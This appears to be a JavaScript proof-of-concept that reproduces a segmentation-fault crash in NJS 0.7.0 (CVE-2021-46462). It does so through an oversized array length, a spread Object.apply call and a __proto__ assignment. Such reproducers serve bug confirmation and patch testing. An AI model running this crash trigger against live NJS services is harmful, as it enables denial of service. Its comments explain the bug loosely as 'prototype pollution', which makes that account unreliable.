// CVE-2021-46462 Proof of Concept
// This exploit targets NJS version 0.7.0
// It causes a segmentation fault through prototype pollution

function main() {
    console.log("Starting CVE-2021-46462 reproduction...");
    
    // Create an array with specific values
    const v3 = [23490, 23490, 23490, 23490];
    console.log("Initial array:", v3);
    
    // Create an empty object
    const v4 = {};
    
    // Set array length to a very large value - this is the key to the vulnerability
    // This creates a sparse array with invalid memory references
    v3.length = 1577595327;
    console.log("Array length set to:", v3.length);
    
    try {
        // This line should trigger the segmentation fault in vulnerable versions
        // Object.apply() with spread operator on the malformed array
        const v9 = Object.apply(...v4, v3);
        
        // Attempt to set __proto__ - this triggers the crash
        v3.__proto__ = v9;
        
        console.log("Exploit completed without crash - version may be patched");
    } catch (error) {
        console.log("Error caught:", error.message);
    }
}

// Execute the main function
main();